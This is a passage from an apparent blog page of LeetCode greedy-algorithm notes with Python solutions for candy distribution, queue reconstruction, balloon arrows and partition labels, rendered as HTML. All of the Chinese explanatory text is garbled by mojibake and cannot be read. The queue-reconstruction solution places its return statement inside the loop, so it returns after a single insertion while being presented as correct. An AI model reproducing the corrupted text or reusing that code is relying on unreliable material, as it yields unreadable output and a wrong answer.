é¢—ç³–æœã€‚</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®ä¸€å®šæ˜¯è¦ç¡®å®šä¸€è¾¹ä¹‹åï¼Œå†ç¡®å®šå¦ä¸€è¾¹ï¼Œä¾‹å¦‚æ¯”è¾ƒæ¯ä¸€ä¸ªå­©å­çš„å·¦è¾¹ï¼Œç„¶åå†æ¯”è¾ƒå³è¾¹ï¼Œå¦‚æœä¸¤è¾¹ä¸€èµ·è€ƒè™‘ä¸€å®šä¼šé¡¾æ­¤å¤±å½¼<br>å…ˆç¡®å®šå³è¾¹è¯„åˆ†å¤§äºå·¦è¾¹çš„æƒ…å†µï¼ˆä¹Ÿå°±æ˜¯ä»å‰å‘åéå†ï¼‰<br>æ­¤æ—¶å±€éƒ¨æœ€ä¼˜ï¼šåªè¦å³è¾¹è¯„åˆ†æ¯”å·¦è¾¹å¤§ï¼Œå³è¾¹çš„å­©å­å°±å¤šä¸€ä¸ªç³–æœï¼Œå…¨å±€æœ€ä¼˜ï¼šç›¸é‚»çš„å­©å­ä¸­ï¼Œè¯„åˆ†é«˜çš„å³å­©å­è·å¾—æ¯”å·¦è¾¹å­©å­æ›´å¤šçš„ç³–æœ<br>å±€éƒ¨æœ€ä¼˜å¯ä»¥æ¨å‡ºå…¨å±€æœ€ä¼˜ã€‚</p><p>å†ç¡®å®šå·¦å­©å­å¤§äºå³å­©å­çš„æƒ…å†µï¼ˆä»åå‘å‰éå†ï¼‰<br>éå†é¡ºåºè¿™é‡Œæœ‰åŒå­¦å¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œä¸ºä»€ä¹ˆä¸èƒ½ä»å‰å‘åéå†å‘¢ï¼Ÿ<br>å› ä¸º rating[5]ä¸rating[4]çš„æ¯”è¾ƒ è¦åˆ©ç”¨ä¸Š rating[5]ä¸rating[6]çš„æ¯”è¾ƒç»“æœï¼Œæ‰€ä»¥ è¦ä»åå‘å‰éå†ã€‚<br>å¦‚æœä»å‰å‘åéå†ï¼Œrating[5]ä¸rating[4]çš„æ¯”è¾ƒ å°±ä¸èƒ½ç”¨ä¸Š rating[5]ä¸rating[6]çš„æ¯”è¾ƒç»“æœäº† ã€‚å¦‚å›¾ï¼š<br><img src="/2025/03/12/algorithm/Greedy/image-1.png"></p><p>æ‰€ä»¥ç¡®å®šå·¦å­©å­å¤§äºå³å­©å­çš„æƒ…å†µä¸€å®šè¦ä»åå‘å‰éå†ï¼<br>å¦‚æœ ratings[i] &gt; ratings[i + 1]ï¼Œæ­¤æ—¶candyVec[i]ï¼ˆç¬¬iä¸ªå°å­©çš„ç³–æœæ•°é‡ï¼‰å°±æœ‰ä¸¤ä¸ªé€‰æ‹©äº†ï¼Œä¸€ä¸ªæ˜¯candyVec[i + 1] + 1ï¼ˆä»å³è¾¹è¿™ä¸ªåŠ 1å¾—åˆ°çš„ç³–æœæ•°é‡ï¼‰ï¼Œä¸€ä¸ªæ˜¯candyVec[i]ï¼ˆä¹‹å‰æ¯”è¾ƒå³å­©å­å¤§äºå·¦å­©å­å¾—åˆ°çš„ç³–æœæ•°é‡ï¼‰ã€‚<br>é‚£ä¹ˆåˆè¦è´ªå¿ƒäº†ï¼Œå±€éƒ¨æœ€ä¼˜ï¼šå–candyVec[i + 1] + 1 å’Œ candyVec[i] æœ€å¤§çš„ç³–æœæ•°é‡ï¼Œä¿è¯ç¬¬iä¸ªå°å­©çš„ç³–æœæ•°é‡æ—¢å¤§äºå·¦è¾¹çš„ä¹Ÿå¤§äºå³è¾¹çš„ã€‚å…¨å±€æœ€ä¼˜ï¼šç›¸é‚»çš„å­©å­ä¸­ï¼Œè¯„åˆ†é«˜çš„å­©å­è·å¾—æ›´å¤šçš„ç³–æœã€‚</p><p>ä¸ºä»€ä¹ˆè¦å– max(candyVec[i], candyVec[i + 1] + 1)ï¼Ÿ<br>å¦‚æœæˆ‘ä»¬ä¸å–æœ€å¤§å€¼ï¼Œè€Œåªæ˜¯ç›´æ¥è®© candyVec[i] &#x3D; candyVec[i + 1] + 1ï¼Œå¯èƒ½ä¼šç ´åç¬¬ä¸€æ¬¡éå†çš„ç»“æœï¼Œå¯¼è‡´æœ€ç»ˆç­”æ¡ˆä¸æ­£ç¡®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">candy</span>(<span class="params">self, ratings: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(ratings)</span><br><span class="line">        candies = [<span class="number">1</span>] * n</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> ratings[i] &gt; ratings[i-<span class="number">1</span>]:</span><br><span class="line">                candies[i] = candies[i-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> ratings[i] &gt; ratings[i+<span class="number">1</span>]:</span><br><span class="line">                candies[i] = <span class="built_in">max</span>(candies[i], candies[i+<span class="number">1</span>]+<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(candies)</span><br></pre></td></tr></table></figure><h2 id="406-æ ¹æ®èº«é«˜é‡å»ºé˜Ÿåˆ—"><a href="#406-æ ¹æ®èº«é«˜é‡å»ºé˜Ÿåˆ—" class="headerlink" title="406. æ ¹æ®èº«é«˜é‡å»ºé˜Ÿåˆ—"></a>406. æ ¹æ®èº«é«˜é‡å»ºé˜Ÿåˆ—</h2><p>å‡è®¾æœ‰æ‰“ä¹±é¡ºåºçš„ä¸€ç¾¤äººç«™æˆä¸€ä¸ªé˜Ÿåˆ—ï¼Œæ•°ç»„ people è¡¨ç¤ºé˜Ÿåˆ—ä¸­ä¸€äº›äººçš„å±æ€§ï¼ˆä¸ä¸€å®šæŒ‰é¡ºåºï¼‰ã€‚æ¯ä¸ª people[i] &#x3D; [hi, ki] è¡¨ç¤ºç¬¬ i ä¸ªäººçš„èº«é«˜ä¸º hi ï¼Œå‰é¢ æ­£å¥½ æœ‰ ki ä¸ªèº«é«˜å¤§äºæˆ–ç­‰äº hi çš„äººã€‚<br>è¯·ä½ é‡æ–°æ„é€ å¹¶è¿”å›è¾“å…¥æ•°ç»„ people æ‰€è¡¨ç¤ºçš„é˜Ÿåˆ—ã€‚è¿”å›çš„é˜Ÿåˆ—åº”è¯¥æ ¼å¼åŒ–ä¸ºæ•°ç»„ queue ï¼Œå…¶ä¸­ queue[j] &#x3D; [hj, kj] æ˜¯é˜Ÿåˆ—ä¸­ç¬¬ j ä¸ªäººçš„å±æ€§ï¼ˆqueue[0] æ˜¯æ’åœ¨é˜Ÿåˆ—å‰é¢çš„äººï¼‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼špeople = [[7,0],[4,4],[7,1],[5,0],[6,1],[5,2]]</span><br><span class="line">è¾“å‡ºï¼š[[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]]</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">ç¼–å·ä¸º 0 çš„äººèº«é«˜ä¸º 5 ï¼Œæ²¡æœ‰èº«é«˜æ›´é«˜æˆ–è€…ç›¸åŒçš„äººæ’åœ¨ä»–å‰é¢ã€‚</span><br><span class="line">ç¼–å·ä¸º 1 çš„äººèº«é«˜ä¸º 7 ï¼Œæ²¡æœ‰èº«é«˜æ›´é«˜æˆ–è€…ç›¸åŒçš„äººæ’åœ¨ä»–å‰é¢ã€‚</span><br><span class="line">ç¼–å·ä¸º 2 çš„äººèº«é«˜ä¸º 5 ï¼Œæœ‰ 2 ä¸ªèº«é«˜æ›´é«˜æˆ–è€…ç›¸åŒçš„äººæ’åœ¨ä»–å‰é¢ï¼Œå³ç¼–å·ä¸º 0 å’Œ 1 çš„äººã€‚</span><br><span class="line">ç¼–å·ä¸º 3 çš„äººèº«é«˜ä¸º 6 ï¼Œæœ‰ 1 ä¸ªèº«é«˜æ›´é«˜æˆ–è€…ç›¸åŒçš„äººæ’åœ¨ä»–å‰é¢ï¼Œå³ç¼–å·ä¸º 1 çš„äººã€‚</span><br><span class="line">ç¼–å·ä¸º 4 çš„äººèº«é«˜ä¸º 4 ï¼Œæœ‰ 4 ä¸ªèº«é«˜æ›´é«˜æˆ–è€…ç›¸åŒçš„äººæ’åœ¨ä»–å‰é¢ï¼Œå³ç¼–å·ä¸º 0ã€1ã€2ã€3 çš„äººã€‚</span><br><span class="line">ç¼–å·ä¸º 5 çš„äººèº«é«˜ä¸º 7 ï¼Œæœ‰ 1 ä¸ªèº«é«˜æ›´é«˜æˆ–è€…ç›¸åŒçš„äººæ’åœ¨ä»–å‰é¢ï¼Œå³ç¼–å·ä¸º 1 çš„äººã€‚</span><br><span class="line">å› æ­¤ [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]] æ˜¯é‡æ–°æ„é€ åçš„é˜Ÿåˆ—ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨æŒ‰ç…§èº«é«˜ä»å¤§åˆ°å°æ’åºåï¼š<br>å±€éƒ¨æœ€ä¼˜ï¼šä¼˜å…ˆæŒ‰èº«é«˜é«˜çš„peopleçš„kæ¥æ’å…¥ã€‚æ’å…¥æ“ä½œè¿‡åçš„peopleæ»¡è¶³é˜Ÿåˆ—å±æ€§<br>å…¨å±€æœ€ä¼˜ï¼šæœ€åéƒ½åšå®Œæ’å…¥æ“ä½œï¼Œæ•´ä¸ªé˜Ÿåˆ—æ»¡è¶³é¢˜ç›®é˜Ÿåˆ—å±æ€§<br>å±€éƒ¨æœ€ä¼˜å¯æ¨å‡ºå…¨å±€æœ€ä¼˜ï¼Œæ‰¾ä¸å‡ºåä¾‹ï¼Œé‚£å°±è¯•è¯•è´ªå¿ƒã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reconstructQueue</span>(<span class="params">self, people: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="comment"># å…ˆæŒ‰ç…§hç»´åº¦çš„èº«é«˜é¡ºåºä»é«˜åˆ°ä½æ’åºã€‚ç¡®å®šç¬¬ä¸€ä¸ªç»´åº¦</span></span><br><span class="line">        <span class="comment"># lambdaè¿”å›çš„æ˜¯ä¸€ä¸ªå…ƒç»„ï¼šå½“-x[0](ç»´åº¦hï¼‰ç›¸åŒæ—¶ï¼Œå†æ ¹æ®x[1]ï¼ˆç»´åº¦kï¼‰ä»å°åˆ°å¤§æ’åº</span></span><br><span class="line">        people.sort(key=<span class="keyword">lambda</span> x:(-x[<span class="number">0</span>], x[<span class="number">1</span>]))</span><br><span class="line">        que = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> people:</span><br><span class="line">            que.insert(p[<span class="number">1</span>], p)</span><br><span class="line">            <span class="keyword">return</span> que</span><br></pre></td></tr></table></figure><h2 id="452-ç”¨æœ€å°‘æ•°é‡çš„ç®­å¼•çˆ†æ°”çƒ"><a href="#452-ç”¨æœ€å°‘æ•°é‡çš„ç®­å¼•çˆ†æ°”çƒ" class="headerlink" title="452. ç”¨æœ€å°‘æ•°é‡çš„ç®­å¼•çˆ†æ°”çƒ"></a>452. ç”¨æœ€å°‘æ•°é‡çš„ç®­å¼•çˆ†æ°”çƒ</h2><p>æœ‰ä¸€äº›çƒå½¢æ°”çƒè´´åœ¨ä¸€å µç”¨ XY å¹³é¢è¡¨ç¤ºçš„å¢™é¢ä¸Šã€‚å¢™é¢ä¸Šçš„æ°”çƒè®°å½•åœ¨æ•´æ•°æ•°ç»„ points ï¼Œå…¶ä¸­points[i] &#x3D; [xstart, xend] è¡¨ç¤ºæ°´å¹³ç›´å¾„åœ¨ xstart å’Œ xendä¹‹é—´çš„æ°”çƒã€‚ä½ ä¸çŸ¥é“æ°”çƒçš„ç¡®åˆ‡ y åæ ‡ã€‚<br>ä¸€æ”¯å¼“ç®­å¯ä»¥æ²¿ç€ x è½´ä»ä¸åŒç‚¹ å®Œå…¨å‚ç›´ åœ°å°„å‡ºã€‚åœ¨åæ ‡ x å¤„å°„å‡ºä¸€æ”¯ç®­ï¼Œè‹¥æœ‰ä¸€ä¸ªæ°”çƒçš„ç›´å¾„çš„å¼€å§‹å’Œç»“æŸåæ ‡ä¸º xstartï¼Œxendï¼Œ ä¸”æ»¡è¶³  xstart â‰¤ x â‰¤ xendï¼Œåˆ™è¯¥æ°”çƒä¼šè¢« å¼•çˆ† ã€‚å¯ä»¥å°„å‡ºçš„å¼“ç®­çš„æ•°é‡ æ²¡æœ‰é™åˆ¶ ã€‚ å¼“ç®­ä¸€æ—¦è¢«å°„å‡ºä¹‹åï¼Œå¯ä»¥æ— é™åœ°å‰è¿›ã€‚<br>ç»™ä½ ä¸€ä¸ªæ•°ç»„ points ï¼Œè¿”å›å¼•çˆ†æ‰€æœ‰æ°”çƒæ‰€å¿…é¡»å°„å‡ºçš„ æœ€å° å¼“ç®­æ•° ã€‚</p><p>ç›´è§‰ä¸Šæ¥çœ‹ï¼Œè²Œä¼¼åªå°„é‡å æœ€å¤šçš„æ°”çƒï¼Œç”¨çš„å¼“ç®­ä¸€å®šæœ€å°‘ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰å½“å‰é‡å äº†ä¸‰ä¸ªæ°”çƒï¼Œæˆ‘å°„ä¸¤ä¸ªï¼Œç•™ä¸‹ä¸€ä¸ªå’Œåé¢çš„ä¸€èµ·å°„è¿™æ ·å¼“ç®­ç”¨çš„æ›´å°‘çš„æƒ…å†µå‘¢ï¼Ÿå°è¯•ä¸€ä¸‹ä¸¾åä¾‹ï¼Œå‘ç°æ²¡æœ‰è¿™ç§æƒ…å†µã€‚<br>é‚£ä¹ˆå°±è¯•ä¸€è¯•è´ªå¿ƒå§ï¼å±€éƒ¨æœ€ä¼˜ï¼šå½“æ°”çƒå‡ºç°é‡å ï¼Œä¸€èµ·å°„ï¼Œæ‰€ç”¨å¼“ç®­æœ€å°‘ã€‚å…¨å±€æœ€ä¼˜ï¼šæŠŠæ‰€æœ‰æ°”çƒå°„çˆ†æ‰€ç”¨å¼“ç®­æœ€å°‘ã€‚<br>ç®—æ³•ç¡®å®šä¸‹æ¥äº†ï¼Œé‚£ä¹ˆå¦‚ä½•æ¨¡æ‹Ÿæ°”çƒå°„çˆ†çš„è¿‡ç¨‹å‘¢ï¼Ÿæ˜¯åœ¨æ•°ç»„ä¸­ç§»é™¤å…ƒç´ è¿˜æ˜¯åšæ ‡è®°å‘¢ï¼Ÿ</p><p>å¦‚æœçœŸå®çš„æ¨¡æ‹Ÿå°„æ°”çƒçš„è¿‡ç¨‹ï¼Œåº”è¯¥å°„ä¸€ä¸ªï¼Œæ°”çƒæ•°ç»„å°±removeä¸€ä¸ªå…ƒç´ ï¼Œè¿™æ ·æœ€ç›´è§‚ï¼Œæ¯•ç«Ÿæ°”çƒè¢«å°„äº†ã€‚<br>ä½†ä»”ç»†æ€è€ƒä¸€ä¸‹å°±å‘ç°ï¼šå¦‚æœæŠŠæ°”çƒæ’åºä¹‹åï¼Œä»å‰åˆ°åéå†æ°”çƒï¼Œè¢«å°„è¿‡çš„æ°”çƒä»…ä»…è·³è¿‡å°±è¡Œäº†ï¼Œæ²¡æœ‰å¿…è¦è®©æ°”çƒæ•°ç»„removeæ°”çƒï¼Œåªè¦è®°å½•ä¸€ä¸‹ç®­çš„æ•°é‡å°±å¯ä»¥äº†ã€‚<br>ä»¥ä¸Šä¸ºæ€è€ƒè¿‡ç¨‹ï¼Œå·²ç»ç¡®å®šä¸‹æ¥ä½¿ç”¨è´ªå¿ƒäº†ï¼Œé‚£ä¹ˆå¼€å§‹è§£é¢˜ã€‚</p><p>ä¸ºäº†è®©æ°”çƒå°½å¯èƒ½çš„é‡å ï¼Œéœ€è¦å¯¹æ•°ç»„è¿›è¡Œæ’åºã€‚<br>é‚£ä¹ˆæŒ‰ç…§æ°”çƒèµ·å§‹ä½ç½®æ’åºï¼Œè¿˜æ˜¯æŒ‰ç…§æ°”çƒç»ˆæ­¢ä½ç½®æ’åºå‘¢ï¼Ÿ<br>å…¶å®éƒ½å¯ä»¥ï¼åªä¸è¿‡å¯¹åº”çš„éå†é¡ºåºä¸åŒï¼Œæˆ‘å°±æŒ‰ç…§æ°”çƒçš„èµ·å§‹ä½ç½®æ’åºäº†ã€‚<br>æ—¢ç„¶æŒ‰ç…§èµ·å§‹ä½ç½®æ’åºï¼Œé‚£ä¹ˆå°±ä»å‰å‘åéå†æ°”çƒæ•°ç»„ï¼Œé å·¦å°½å¯èƒ½è®©æ°”çƒé‡å¤ã€‚<br>ä»å‰å‘åéå†é‡åˆ°é‡å çš„æ°”çƒäº†æ€ä¹ˆåŠï¼Ÿ<br>å¦‚æœæ°”çƒé‡å äº†ï¼Œé‡å æ°”çƒä¸­å³è¾¹è¾¹ç•Œçš„æœ€å°å€¼ ä¹‹å‰çš„åŒºé—´ä¸€å®šéœ€è¦ä¸€ä¸ªå¼“ç®­ã€‚<br>ä»¥é¢˜ç›®ç¤ºä¾‹ï¼š [[10,16],[2,8],[1,6],[7,12]]ä¸ºä¾‹ï¼Œå¦‚å›¾ï¼šï¼ˆæ–¹ä¾¿èµ·è§ï¼Œå·²ç»æ’åºï¼‰<br><img src="/2025/03/12/algorithm/Greedy/image-2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findMinArrowShots</span>(<span class="params">self, points: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(points) == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        points.sort(key = <span class="keyword">lambda</span> x : x[<span class="number">0</span>])</span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(points)):</span><br><span class="line">            <span class="keyword">if</span> points[i][<span class="number">0</span>] &gt; points[i-<span class="number">1</span>][<span class="number">1</span>]:</span><br><span class="line">                result += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                points[i][<span class="number">1</span>] = <span class="built_in">min</span>(points[i-<span class="number">1</span>][<span class="number">1</span>], points[i][<span class="number">1</span>]) <span class="comment"># æ›´æ–°æœ€å°å³è¾¹ç•Œ</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="763-åˆ’åˆ†å­—æ¯åŒºé—´"><a href="#763-åˆ’åˆ†å­—æ¯åŒºé—´" class="headerlink" title="763. åˆ’åˆ†å­—æ¯åŒºé—´"></a>763. åˆ’åˆ†å­—æ¯åŒºé—´</h2><p>ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² s ã€‚æˆ‘ä»¬è¦æŠŠè¿™ä¸ªå­—ç¬¦ä¸²åˆ’åˆ†ä¸ºå°½å¯èƒ½å¤šçš„ç‰‡æ®µï¼ŒåŒä¸€å­—æ¯æœ€å¤šå‡ºç°åœ¨ä¸€ä¸ªç‰‡æ®µä¸­ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸² â€œababccâ€ èƒ½å¤Ÿè¢«åˆ†ä¸º [â€œababâ€, â€œccâ€]ï¼Œä½†ç±»ä¼¼ [â€œabaâ€, â€œbccâ€] æˆ– [â€œabâ€, â€œabâ€, â€œccâ€] çš„åˆ’åˆ†æ˜¯éæ³•çš„ã€‚<br>æ³¨æ„ï¼Œåˆ’åˆ†ç»“æœéœ€è¦æ»¡è¶³ï¼šå°†æ‰€æœ‰åˆ’åˆ†ç»“æœæŒ‰é¡ºåºè¿æ¥ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²ä»ç„¶æ˜¯ s ã€‚<br>è¿”å›ä¸€ä¸ªè¡¨ç¤ºæ¯ä¸ªå­—ç¬¦ä¸²ç‰‡æ®µçš„é•¿åº¦çš„åˆ—è¡¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;ababcbacadefegdehijhklij&quot;</span><br><span class="line">è¾“å‡ºï¼š[9,7,8]</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">åˆ’åˆ†ç»“æœä¸º &quot;ababcbaca&quot;ã€&quot;defegde&quot;ã€&quot;hijhklij&quot; ã€‚</span><br><span class="line">æ¯ä¸ªå­—æ¯æœ€å¤šå‡ºç°åœ¨ä¸€ä¸ªç‰‡æ®µä¸­ã€‚</span><br><span class="line">åƒ &quot;ababcbacadefegde&quot;, &quot;hijhklij&quot; è¿™æ ·çš„åˆ’åˆ†æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºåˆ’åˆ†çš„ç‰‡æ®µæ•°è¾ƒå°‘ã€‚ </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">partitionLabels</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        last_occurrence = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">            last_occurrence[ch] = i</span><br><span class="line"></span><br><span class="line">        result = []</span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        end = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">            end = <span class="built_in">max</span>(end, last_occurrence[ch]) <span class="comment">#æ‰¾åˆ°å½“å‰åŒºé—´å†…æ‰€æœ‰å­—ç¬¦å‡ºç°çš„æœ€è¿œä½ç½®</span></span><br><span class="line">            <span class="keyword">if</span> i == end:</span><br><span class="line">                result.append(end-start+<span class="number">1</span>)</span><br><span class="line">                start = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="comment"># ä¸452.ç”¨æœ€å°‘æ•°é‡çš„ç®­å¼•çˆ†æ°”çƒ (opens new window)ã€435.æ— é‡å åŒºé—´ (opens new window)ç›¸åŒçš„æ€è·¯ã€‚</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">countLabels</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªé•¿åº¦ä¸º26çš„åŒºé—´åˆ—è¡¨</span></span><br><span class="line">        <span class="built_in">hash</span> = [[<span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>), <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line">        hash_filter = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hash</span>[<span class="built_in">ord</span>(s[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)][<span class="number">0</span>] == <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>):</span><br><span class="line">                <span class="built_in">hash</span>[<span class="built_in">ord</span>(s[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)][<span class="number">0</span>] = i</span><br><span class="line">            <span class="built_in">hash</span>[<span class="built_in">ord</span>(s[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)][<span class="number">1</span>] = i</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">hash</span>)):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hash</span>[i][<span class="number">0</span>] != <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>):</span><br><span class="line">                hash_filter.append(<span class="built_in">hash</span>[i])</span><br><span class="line">        <span class="keyword">return</span> hash_filter</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">partitionLabels</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        res = []</span><br><span class="line">        <span class="built_in">hash</span> = <span class="variable language_">self</span>.countLabels(s)</span><br><span class="line">        <span class="built_in">hash</span>.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>]) </span><br><span class="line">        rightBoard = <span class="built_in">hash</span>[<span class="number">0</span>][<span class="number">1</span>] <span class="comment"># è®°å½•æœ€å¤§æœ‰è¾¹ç•Œ</span></span><br><span class="line">        leftBoard = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(<span class="built_in">hash</span>)):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hash</span>[i][<span class="number">0</span>] &gt; rightBoard:</span><br><span class="line">                res.append(rightBoard - leftBoard + <span class="number">1</span>)</span><br><span class="line">                leftBoard = <span class="built_in">hash</span>[i][<span class="number">0</span>]</span><br><span class="line">            rightBoard = <span class="built_in">max</span>(rightBoard, <span class="built_in">hash</span>[i][<span class="number">1</span>])</span><br><span class="line">        res.append(rightBoard - leftBoard + <span class="number">1</span>) <span class="comment"># æœ€å³ç«¯</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>end è®°å½•çš„æ˜¯å½“å‰ç‰‡æ®µä¸­æ‰€æœ‰å­—ç¬¦çš„æœ€è¿œå‡ºç°ä½ç½®ã€‚</p><h2 id="738-å•è°ƒé€’å¢çš„æ•°å­—"><a href="#738-å•è°ƒé€’å¢çš„æ•°å­—" class="headerlink" title="738. å•è°ƒé€’å¢çš„æ•°å­—"></a>738. å•è°ƒé€’å¢çš„æ•°å­—</h2><p>å½“ä¸”ä»…å½“æ¯ä¸ªç›¸é‚»ä½æ•°ä¸Šçš„æ•°å­— x å’Œ y æ»¡è¶³ x &lt;&#x3D; y æ—¶ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªæ•´æ•°æ˜¯å•è°ƒé€’å¢çš„ã€‚<br>ç»™å®šä¸€ä¸ªæ•´æ•° n ï¼Œè¿”å› å°äºæˆ–ç­‰äº n 